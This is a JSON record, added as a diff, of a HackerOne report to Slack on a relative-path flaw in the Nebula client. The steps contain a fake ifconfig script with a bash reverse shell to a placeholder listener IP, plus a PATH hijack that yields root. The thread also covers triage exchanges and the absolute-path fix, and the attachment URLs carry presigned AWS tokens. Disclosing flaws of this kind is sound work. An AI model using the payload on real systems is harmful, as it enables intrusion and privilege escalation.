@@ -1,0 +1,656 @@
+{
+  "id": 784714,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC83ODQ3MTQ=",
+  "url": "https://hackerone.com/reports/784714",
+  "title": "Relative Path Vulnerability Results in Arbitrary Command Execution/Privilege Escalation",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "medium",
+  "readable_substate": "Resolved",
+  "created_at": "2020-01-28T12:43:33.476Z",
+  "submitted_at": "2020-01-28T12:43:33.476Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "jhancock",
+    "url": "/jhancock",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 69,
+    "url": "https://hackerone.com/slack",
+    "handle": "slack",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/069/683fee312381bc46cadc7ea1950abc87944d12c3_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/069/683fee312381bc46cadc7ea1950abc87944d12c3_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+    },
+    "permissions": [
+
+    ],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "profile": {
+      "name": "Slack",
+      "twitter_handle": "slackhq",
+      "website": "https://slack.com",
+      "about": "All your team communication in one place, instantly searchable, and available wherever you go."
+    }
+  },
+  "has_bounty?": true,
+  "in_validation?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+
+  ],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2020-04-01T22:10:32.788Z",
+  "bug_reporter_agreed_on_going_public_at": "2020-03-02T22:10:24.076Z",
+  "team_member_agreed_on_going_public_at": null,
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "### Overview###\nThe Nebula clients for Darwin and Windows call relative paths in \"exec.Command\" to \"ifconfig\" and \"route\" executables on Darwin, and to \"netsh\" on Windows. These commands are entered using relative paths, not absolute paths (such as /sbin/ifconfig). When a binary is run with a relative path, the system uses environmental variables (\"PATH\") to determine the search order of folders that should be searched for the command run. By modifying the environmental variable, an attacker can prioritize an arbitrary path containing a binary of the same name, and it will execute when Nebula runs. \n\nThe affected code can be found at https://github.com/slackhq/nebula/search?q=exec.Command&unscoped_q=exec.Command); specifically:\n\nnebula/tun_darwin.go:45\nnebula/tun_darwin.go:48\nnebula/tun_darwin.go:51\nnebula/tun_darwin.go:56\nnebula/tun_windows:50\nnebula/tun_windows:60\n\n###Steps###\nTo reproduce this attack, open a terminal on a MacOS system running the Darwin Nebula client and a terminal on a Linux or MacOS system to catch the shell. Perform the following steps:\n1. On a host accessible to the MacOS system, run the following command to start a Netcat listener:\n`sudo nc -nvlp 443`\n\n2. On the MacOS system with the Nebula client, run the command \"whoami\" (or id) and \"hostname\"\n\n3. Nebula attempts to call the \"ifconfig\" command, including three variables. A script file containing a pass-through to ifconfig must be created, but should include a bash reverse shell connecting to the IP address of the system in step 1 (\"LISTENER_IP_ADDRESS\"). Create a file in the /tmp/ folder called \"ifconfig\". Enter the following code the file:\n```\n#!/bin/bash\nbash -i >& /dev/tcp/LISTENER_IP_ADDRESS/443 0>&1 &\nDEVICE=$1\nCIDER=$2\nIP=$3\n/sbin/ifconfig $1 $2 $3\n\n4. Make the script executable by running `chmod +x /tmp/ifconfig`\n\n5. Run the Nebula client with the command `sudo ./nebula -config config.yml`. When the ifconfig command is called, it will execute the reverse shell command in the script and then continue connecting.\n\n6. On the host in step 1, a reverse Bash shell connects. Run the command \"whoami\" (or id) and \"hostname\" and verify the user is now root, and the hostname is the hostname of the MacOS computer in step 2.\n\nNote: To perform this attack on Windows, a custom binary would need to be compiled and named \"netsh\" but the principles are the same on each OS. \n\n###Resolution###\nModify the paths on the affected lines to absolute paths. For example, line 45 of nebula/tun_darwin.go reads:\n\n```if err = exec.Command(\"ifconfig\", c.Device, c.Cidr.String(), c.Cidr.IP.String()).Run(); err != nil {```\n\nModify this snippet to provide an absolute path, as shown below:\n\n```if err = exec.Command(\"/sbin/ifconfig\", c.Device, c.Cidr.String(), c.Cidr.IP.String()).Run(); err != nil```\n\n## Impact\n\nBecause Nebula must be run with root/sudo permissions, this can be an effective privilege escalation technique. A standard user can modify the environment and create files in /tmp, and when Nebula is run, the command will open a reverse shell as the root user (see screenshots). Additionally, this could be used to maintain stealthy persistence on an affected machine. Because Nebula must restart to pick up changes to the config.yaml (such as firewall rules), it is reasonable to believe an attacker with presence on the box could modify the PATH settings and script, and the process would be restarted at some point in the future.",
+  "bounty_amount": "750.0",
+  "formatted_bounty": "$750",
+  "weakness": {
+    "id": 58,
+    "name": "Command Injection - Generic"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+
+  ],
+  "allow_singular_disclosure_at": "2020-04-01T22:10:24.187Z",
+  "allow_singular_disclosure_after": -109675250.10714754,
+  "singular_disclosure_allowed": true,
+  "vote_count": 9,
+  "voters": [
+    "bitsscrambler",
+    "santieich",
+    "trainr3kt",
+    "cryptographer",
+    "hex0x0f",
+    "ram15",
+    "shimura",
+    "gustavetxc01",
+    "jimithefox"
+  ],
+  "severity": {
+    "rating": "medium",
+    "score": 6.8,
+    "author_type": "Team",
+    "metrics": {
+      "attack_vector": "physical",
+      "attack_complexity": "low",
+      "privileges_required": "high",
+      "user_interaction": "none",
+      "scope": "changed",
+      "confidentiality": "high",
+      "integrity": "high",
+      "availability": "none"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 40624,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "https://github.com/slackhq/nebula",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [
+
+    ],
+    "assignable_team_member_groups": [
+
+    ]
+  },
+  "activities": [
+    {
+      "id": 6890561,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Adding screenshots",
+      "automated_response": false,
+      "created_at": "2020-01-28T12:44:25.984Z",
+      "updated_at": "2020-01-28T12:44:25.984Z",
+      "actor": {
+        "username": "jhancock",
+        "cleared": false,
+        "verified": false,
+        "url": "/jhancock",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "attachments": [
+        {
+          "id": 698566,
+          "filename": "Slack_BB_Nebula_script.png",
+          "type": "image/png",
+          "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/5gjJk2wPjcR2frtCCmWCJXLd?response-content-disposition=attachment%3B%20filename%3D%22Slack_BB_Nebula_script.png%22%3B%20filename%2A%3DUTF-8%27%27Slack_BB_Nebula_script.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ3R5LIR7E%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T073114Z&X-Amz-Expires=1605&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJHMEUCIQC8A6iLd6fdizoKiDmGTMJOtEK0j%2B9m1Hwg8kDIhR3i4wIgU1cbUALHKJVW4fP2UzLm%2Fzggy%2Br2f2qSsa5O9UhWw3gqsgUIIxADGgwwMTM2MTkyNzQ4NDkiDJxg6%2BdxWFHEdpNOiSqPBbOGoWCMpPDSC5i104drxenzKlJmKtfbaPYXcEUk5xzpfFz7qlzMHzxshj0ZGvQ9B6u%2FX6LPbR7Sl3mWyjkMgqtizxl77eMrAi1ar%2FJkwIbmf%2B0it8tRDIPTWPFce%2F%2FHd%2BmtmIG4RB%2BQvydMEyr5Q8nhoRP6O%2FjYWWnkb%2BRNcelyK2xmsSwGLQOdlU2enMwhOK3BPGXmuh1bofm3xd5cvTpV39JpV6%2FHz%2BXsNZvVfqbg%2BXuKaDVhROLMjPyKGTGTay0tNg%2BACp27ysa5IWV%2BI31t19hmXNWzs3ESd2B9nf6c8Joaw9cZ0BFv5SPhCjzrknQ3HXC67SgBpIKoEk6LXEaEw2NmKmI7XCGH3bhCHfpUPAj9Mi5Cb%2BK85SWDjSiu91Bd4pe4XmONhhEzu%2BHUsNC4KzHg%2FM4pD%2BGx8ddmYnr3tdArcXEpk67wbeRug1K27YWz%2FVO96fiXdkS9Xm5J9hNQAGlePyFuIN5mOMBg2d%2BcjkTZF8kSHHvqXSqPAQgX6ugFlVoubAsd7KnyrCvE4eFyHIZVo3oV5JU82FGBbUj3s5lUYQdYVFd3Ps16Rt1PGkRAUwR7cXlVvplJS0rb8610%2BG17raAQwJy8cRN7s3KyQNhdXXIQRdJRhKYg1JE%2FNIQcwkwywKN%2FsigvOXECelwnnne41q2BURRgR4GCNgRxam2jBgUkUJjQtQ%2FokWvEQYLIA4f9HX9kkcgw0kkfFu5UJq73bMC%2BU%2F3eZ7B4Zy9taEIGKwSg86qyFVg860n2oAiN%2FfpKAx8tRUW8DTjM2X54yGGHPadIq0Hu8cZCkJQ4Th5tIC7R%2BHPfSgSag0HBfAmzZ5118Q9ZwkkntRTVxAl1pkGthGbtGkww1jjKCJ0wwoe5qAY6sQHDRGqTlml9JOa7pcIPnENAbSjPA%2BNnrcJ1TNMO0BkSMWqUN9w1vudtRvjp773httgmTyAlYuxH7EmlIPFmJQ6Gu1DzzT7rLiEF2GE0t7B2q9gxwFisSqlUh5Y1Lwu%2BtN5x1TzSiMb5y26sSzmQ%2BShQL8fCGA23tpHtpIE9ans0LS34EwJCOxZwBH%2BHx9OzuRqjdgDlu23FbHdQ6SG6rIzVi21GM%2BTw0KAnkoR1gvqPjRk%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=d4bfc6ceede7893bfca768b888c491794cd307423e217f9e0811119e072bf912"
+        },
+        {
+          "id": 698565,
+          "filename": "Slack_BB_Nebula_client_darwin.png",
+          "type": "image/png",
+          "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/kyHvCeqXwoEpCesBkqKYpmf3?response-content-disposition=attachment%3B%20filename%3D%22Slack_BB_Nebula_client_darwin.png%22%3B%20filename%2A%3DUTF-8%27%27Slack_BB_Nebula_client_darwin.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ3R5LIR7E%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T073114Z&X-Amz-Expires=1605&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJHMEUCIQC8A6iLd6fdizoKiDmGTMJOtEK0j%2B9m1Hwg8kDIhR3i4wIgU1cbUALHKJVW4fP2UzLm%2Fzggy%2Br2f2qSsa5O9UhWw3gqsgUIIxADGgwwMTM2MTkyNzQ4NDkiDJxg6%2BdxWFHEdpNOiSqPBbOGoWCMpPDSC5i104drxenzKlJmKtfbaPYXcEUk5xzpfFz7qlzMHzxshj0ZGvQ9B6u%2FX6LPbR7Sl3mWyjkMgqtizxl77eMrAi1ar%2FJkwIbmf%2B0it8tRDIPTWPFce%2F%2FHd%2BmtmIG4RB%2BQvydMEyr5Q8nhoRP6O%2FjYWWnkb%2BRNcelyK2xmsSwGLQOdlU2enMwhOK3BPGXmuh1bofm3xd5cvTpV39JpV6%2FHz%2BXsNZvVfqbg%2BXuKaDVhROLMjPyKGTGTay0tNg%2BACp27ysa5IWV%2BI31t19hmXNWzs3ESd2B9nf6c8Joaw9cZ0BFv5SPhCjzrknQ3HXC67SgBpIKoEk6LXEaEw2NmKmI7XCGH3bhCHfpUPAj9Mi5Cb%2BK85SWDjSiu91Bd4pe4XmONhhEzu%2BHUsNC4KzHg%2FM4pD%2BGx8ddmYnr3tdArcXEpk67wbeRug1K27YWz%2FVO96fiXdkS9Xm5J9hNQAGlePyFuIN5mOMBg2d%2BcjkTZF8kSHHvqXSqPAQgX6ugFlVoubAsd7KnyrCvE4eFyHIZVo3oV5JU82FGBbUj3s5lUYQdYVFd3Ps16Rt1PGkRAUwR7cXlVvplJS0rb8610%2BG17raAQwJy8cRN7s3KyQNhdXXIQRdJRhKYg1JE%2FNIQcwkwywKN%2FsigvOXECelwnnne41q2BURRgR4GCNgRxam2jBgUkUJjQtQ%2FokWvEQYLIA4f9HX9kkcgw0kkfFu5UJq73bMC%2BU%2F3eZ7B4Zy9taEIGKwSg86qyFVg860n2oAiN%2FfpKAx8tRUW8DTjM2X54yGGHPadIq0Hu8cZCkJQ4Th5tIC7R%2BHPfSgSag0HBfAmzZ5118Q9ZwkkntRTVxAl1pkGthGbtGkww1jjKCJ0wwoe5qAY6sQHDRGqTlml9JOa7pcIPnENAbSjPA%2BNnrcJ1TNMO0BkSMWqUN9w1vudtRvjp773httgmTyAlYuxH7EmlIPFmJQ6Gu1DzzT7rLiEF2GE0t7B2q9gxwFisSqlUh5Y1Lwu%2BtN5x1TzSiMb5y26sSzmQ%2BShQL8fCGA23tpHtpIE9ans0LS34EwJCOxZwBH%2BHx9OzuRqjdgDlu23FbHdQ6SG6rIzVi21GM%2BTw0KAnkoR1gvqPjRk%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=27c84eb511d7fde8fa4bd1965b483760098289af79d7ef710bdca6a316d282eb"
+        },
+        {
+          "id": 698564,
+          "filename": "Slack_BB_Nebula_listening_server.png",
+          "type": "image/png",
+          "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/auWdhq8c63vCSKz7EftXro5n?response-content-disposition=attachment%3B%20filename%3D%22Slack_BB_Nebula_listening_server.png%22%3B%20filename%2A%3DUTF-8%27%27Slack_BB_Nebula_listening_server.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ3R5LIR7E%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T073114Z&X-Amz-Expires=1605&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJHMEUCIQC8A6iLd6fdizoKiDmGTMJOtEK0j%2B9m1Hwg8kDIhR3i4wIgU1cbUALHKJVW4fP2UzLm%2Fzggy%2Br2f2qSsa5O9UhWw3gqsgUIIxADGgwwMTM2MTkyNzQ4NDkiDJxg6%2BdxWFHEdpNOiSqPBbOGoWCMpPDSC5i104drxenzKlJmKtfbaPYXcEUk5xzpfFz7qlzMHzxshj0ZGvQ9B6u%2FX6LPbR7Sl3mWyjkMgqtizxl77eMrAi1ar%2FJkwIbmf%2B0it8tRDIPTWPFce%2F%2FHd%2BmtmIG4RB%2BQvydMEyr5Q8nhoRP6O%2FjYWWnkb%2BRNcelyK2xmsSwGLQOdlU2enMwhOK3BPGXmuh1bofm3xd5cvTpV39JpV6%2FHz%2BXsNZvVfqbg%2BXuKaDVhROLMjPyKGTGTay0tNg%2BACp27ysa5IWV%2BI31t19hmXNWzs3ESd2B9nf6c8Joaw9cZ0BFv5SPhCjzrknQ3HXC67SgBpIKoEk6LXEaEw2NmKmI7XCGH3bhCHfpUPAj9Mi5Cb%2BK85SWDjSiu91Bd4pe4XmONhhEzu%2BHUsNC4KzHg%2FM4pD%2BGx8ddmYnr3tdArcXEpk67wbeRug1K27YWz%2FVO96fiXdkS9Xm5J9hNQAGlePyFuIN5mOMBg2d%2BcjkTZF8kSHHvqXSqPAQgX6ugFlVoubAsd7KnyrCvE4eFyHIZVo3oV5JU82FGBbUj3s5lUYQdYVFd3Ps16Rt1PGkRAUwR7cXlVvplJS0rb8610%2BG17raAQwJy8cRN7s3KyQNhdXXIQRdJRhKYg1JE%2FNIQcwkwywKN%2FsigvOXECelwnnne41q2BURRgR4GCNgRxam2jBgUkUJjQtQ%2FokWvEQYLIA4f9HX9kkcgw0kkfFu5UJq73bMC%2BU%2F3eZ7B4Zy9taEIGKwSg86qyFVg860n2oAiN%2FfpKAx8tRUW8DTjM2X54yGGHPadIq0Hu8cZCkJQ4Th5tIC7R%2BHPfSgSag0HBfAmzZ5118Q9ZwkkntRTVxAl1pkGthGbtGkww1jjKCJ0wwoe5qAY6sQHDRGqTlml9JOa7pcIPnENAbSjPA%2BNnrcJ1TNMO0BkSMWqUN9w1vudtRvjp773httgmTyAlYuxH7EmlIPFmJQ6Gu1DzzT7rLiEF2GE0t7B2q9gxwFisSqlUh5Y1Lwu%2BtN5x1TzSiMb5y26sSzmQ%2BShQL8fCGA23tpHtpIE9ans0LS34EwJCOxZwBH%2BHx9OzuRqjdgDlu23FbHdQ6SG6rIzVi21GM%2BTw0KAnkoR1gvqPjRk%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=9d2acba2ea656645733dff18458795903a4297212f7e8216cd031cd6c41b7e76"
+        }
+      ],
+      "genius_execution_id": null,
+      "team_handle": "slack"
+    },
+    {
+      "id": 6896378,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Apologies for missing a step - after creating the script and making it executable, add /tmp to the path by running\n`export PATH=/tmp:$PATH`\n\nThen run nebula  ",
+      "automated_response": false,
+      "created_at": "2020-01-29T02:36:24.929Z",
+      "updated_at": "2020-01-29T02:36:24.929Z",
+      "actor": {
+        "username": "jhancock",
+        "cleared": false,
+        "verified": false,
+        "url": "/jhancock",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "slack"
+    },
+    {
+      "id": 6912045,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BugNeedsMoreInfo",
+      "message": "Thank you for your report @jhancock,\n\nWe want to make sure we fully understand the attack scenario for this behavior. According to your report, an attacker with physical access to a victim's device, (or the ability to run commands), can use this behavior to run commands on a victim's device as a superuser. An attacker does this by adding an environment variable which causes Nebula to run an attacker's malicious ifconfig command due to a relative path used in Nebula. However, when the Sudo command is run on some operating systems a new root user environment is created mitigating an attacker's ability to add a relative path to the sudo environment. \n\nWhat OS did you use to test this behavior? Did your OS have any specific features that caused environmental variables to be retained in the super user's bash environment?\n\n\nThank you for thinking of Slack Security",
+      "automated_response": false,
+      "created_at": "2020-01-30T05:50:38.671Z",
+      "updated_at": "2020-01-30T05:50:38.671Z",
+      "actor": {
+        "username": "bugtriage-sophia",
+        "cleared": false,
+        "verified": false,
+        "url": "/bugtriage-sophia",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "slack"
+    },
+    {
+      "id": 6920248,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BugNew",
+      "message": "Hi Sophia, \n\nThanks for getting back to me. First, the attack does not require physical access - the system could be compromised through a remote login session, an exploit in another software package installed on the machine, compromised SSH keys, etc. The initial access vector doesnt matter much, but the attacker only needs remote access. \n\nNext, the superuser attack with sudo as you described is one possible attack path. While some operating systems do reset the environment or pull from environmental configs when sudo is used, a fully patched default Mac OS installation does not. This is evidenced by the screenshots provided. Sudo su would reset the environment on Mac OS, but that isnt the attack path in question. \n\nAdditionally, attack paths exist outside of privilege escalation. An attacker with a foothold on the machine could use this for a persistence mechanism, regaining access each time Nebula was run regardless. At the end of the day, an attacker can execute unexpected code when running Nebula - this should never happen; an application should only execute functions and code that it expects and intends to run. ",
+      "automated_response": false,
+      "created_at": "2020-01-30T13:34:10.571Z",
+      "updated_at": "2020-01-30T13:34:10.571Z",
+      "actor": {
+        "username": "jhancock",
+        "cleared": false,
+        "verified": false,
+        "url": "/jhancock",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "slack"
+    },
+    {
+      "id": 6936131,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Thank you for your response @jhancock,\n\nWe are investigating the behavior you described and will get back to you when we have more information.\n\nThank you for thinking of Slack security.",
+      "automated_response": false,
+      "created_at": "2020-01-31T20:04:30.950Z",
+      "updated_at": "2020-01-31T20:04:30.950Z",
+      "actor": {
+        "username": "bugtriage-sophia",
+        "cleared": false,
+        "verified": false,
+        "url": "/bugtriage-sophia",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "slack"
+    },
+    {
+      "id": 6960469,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Hello,\n\nCan you please provide an update on verification? Are more screenshots or clarifications needed from me?",
+      "automated_response": false,
+      "created_at": "2020-02-04T13:41:38.725Z",
+      "updated_at": "2020-02-04T13:41:38.725Z",
+      "actor": {
+        "username": "jhancock",
+        "cleared": false,
+        "verified": false,
+        "url": "/jhancock",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "slack"
+    },
+    {
+      "id": 6988835,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Hi, \n\nCan you provide a status update please?  ",
+      "automated_response": false,
+      "created_at": "2020-02-07T16:02:35.651Z",
+      "updated_at": "2020-02-07T16:02:35.651Z",
+      "actor": {
+        "username": "jhancock",
+        "cleared": false,
+        "verified": false,
+        "url": "/jhancock",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "slack"
+    },
+    {
+      "id": 7010416,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "We apologize for the delay @jhancock\n\nWe are still looking into this one, but should be able to get back to your soon.",
+      "automated_response": false,
+      "created_at": "2020-02-10T19:32:59.075Z",
+      "updated_at": "2020-02-10T19:32:59.075Z",
+      "actor": {
+        "username": "bugtriage-josh",
+        "cleared": false,
+        "verified": false,
+        "url": "/bugtriage-josh",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "slack"
+    },
+    {
+      "id": 7057854,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BugNeedsMoreInfo",
+      "message": "Thank you for your patience @jhancock \n\nAs a best practice, we understand that Nebula should not use relative paths in code and will look into addressing this behavior as a defense in depth measure.\n\nHowever,  we have been doing some internal testing and we are having difficulty exploiting this issue, as you have described, on our OSX devices. In our tests, we were unable to modify the `Path` variable of our super user (`sudo`) shell using the command `export PATH=/tmp:$PATH`. It seems that some OSX devices by default use a separate Path variable when a command is run as a superuser. This also appears to be the default behavior on Debian and Ubuntu.\n\nCan you provide us a video that demonstrates this behavior on a default OSX install, so we can better understand your testing process?\n\nIn addition, you state the affected code can be found specifically in `tun_darwin.go` and `tun_windows.go`. Have you discovered any other files that contain relative files paths which could be vulnerable to this behavior? (e.g. `tun_linux.go`)\n\n\nThank you for thinking of Slack Security.",
+      "automated_response": false,
+      "created_at": "2020-02-15T00:45:44.027Z",
+      "updated_at": "2020-02-15T00:45:44.027Z",
+      "actor": {
+        "username": "bugtriage-sophia",
+        "cleared": false,
+        "verified": false,
+        "url": "/bugtriage-sophia",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "slack"
+    },
+    {
+      "id": 7067426,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BugNew",
+      "message": "Sophia, \n\nThanks for getting back to me. The behavior was only discovered in tun_darwin.go and tun_windows.go; tun_linux.go appears to use syscalls versus calling a program and other files do not appear to call programs externally either. \n\nThe behavior reported has been replicated on several machines in my lab. I spun up a fresh 'macincloud.com' instance to demonstrate the behavior on a new freshly installed machine. Ive attached the video. \n\nIf you're running \"sudo env\" you wont see your path; thats accurate. However, running sudo <program> (in this case, \"sudo ./nebula -config config.yml\") fires off the program based on the current user's environment, as demonstrated in the video. Please replicate the steps in the video to see the vulnerability in action and how it can lead to some seriously bad things. Note as well in the video that the user running the commands is called \"admin\" and the shell that is caught is root, the highest level of access on a Unix based machine - clear privilege escalation by relative path abuse.",
+      "automated_response": false,
+      "created_at": "2020-02-17T05:40:24.861Z",
+      "updated_at": "2020-02-17T05:40:41.396Z",
+      "actor": {
+        "username": "jhancock",
+        "cleared": false,
+        "verified": false,
+        "url": "/jhancock",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "attachments": [
+        {
+          "id": 718856,
+          "filename": "nebula.mov",
+          "type": "video/quicktime",
+          "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/xTEc8h22S1BL3Y7EQqNwEgNC?response-content-disposition=attachment%3B%20filename%3D%22nebula.mov%22%3B%20filename%2A%3DUTF-8%27%27nebula.mov&response-content-type=video%2Fquicktime&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ3R5LIR7E%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T073114Z&X-Amz-Expires=1605&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJHMEUCIQC8A6iLd6fdizoKiDmGTMJOtEK0j%2B9m1Hwg8kDIhR3i4wIgU1cbUALHKJVW4fP2UzLm%2Fzggy%2Br2f2qSsa5O9UhWw3gqsgUIIxADGgwwMTM2MTkyNzQ4NDkiDJxg6%2BdxWFHEdpNOiSqPBbOGoWCMpPDSC5i104drxenzKlJmKtfbaPYXcEUk5xzpfFz7qlzMHzxshj0ZGvQ9B6u%2FX6LPbR7Sl3mWyjkMgqtizxl77eMrAi1ar%2FJkwIbmf%2B0it8tRDIPTWPFce%2F%2FHd%2BmtmIG4RB%2BQvydMEyr5Q8nhoRP6O%2FjYWWnkb%2BRNcelyK2xmsSwGLQOdlU2enMwhOK3BPGXmuh1bofm3xd5cvTpV39JpV6%2FHz%2BXsNZvVfqbg%2BXuKaDVhROLMjPyKGTGTay0tNg%2BACp27ysa5IWV%2BI31t19hmXNWzs3ESd2B9nf6c8Joaw9cZ0BFv5SPhCjzrknQ3HXC67SgBpIKoEk6LXEaEw2NmKmI7XCGH3bhCHfpUPAj9Mi5Cb%2BK85SWDjSiu91Bd4pe4XmONhhEzu%2BHUsNC4KzHg%2FM4pD%2BGx8ddmYnr3tdArcXEpk67wbeRug1K27YWz%2FVO96fiXdkS9Xm5J9hNQAGlePyFuIN5mOMBg2d%2BcjkTZF8kSHHvqXSqPAQgX6ugFlVoubAsd7KnyrCvE4eFyHIZVo3oV5JU82FGBbUj3s5lUYQdYVFd3Ps16Rt1PGkRAUwR7cXlVvplJS0rb8610%2BG17raAQwJy8cRN7s3KyQNhdXXIQRdJRhKYg1JE%2FNIQcwkwywKN%2FsigvOXECelwnnne41q2BURRgR4GCNgRxam2jBgUkUJjQtQ%2FokWvEQYLIA4f9HX9kkcgw0kkfFu5UJq73bMC%2BU%2F3eZ7B4Zy9taEIGKwSg86qyFVg860n2oAiN%2FfpKAx8tRUW8DTjM2X54yGGHPadIq0Hu8cZCkJQ4Th5tIC7R%2BHPfSgSag0HBfAmzZ5118Q9ZwkkntRTVxAl1pkGthGbtGkww1jjKCJ0wwoe5qAY6sQHDRGqTlml9JOa7pcIPnENAbSjPA%2BNnrcJ1TNMO0BkSMWqUN9w1vudtRvjp773httgmTyAlYuxH7EmlIPFmJQ6Gu1DzzT7rLiEF2GE0t7B2q9gxwFisSqlUh5Y1Lwu%2BtN5x1TzSiMb5y26sSzmQ%2BShQL8fCGA23tpHtpIE9ans0LS34EwJCOxZwBH%2BHx9OzuRqjdgDlu23FbHdQ6SG6rIzVi21GM%2BTw0KAnkoR1gvqPjRk%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=46bad94d1569e882b4f82de56d251d9457a1d8e3c75ff2b116b8e6d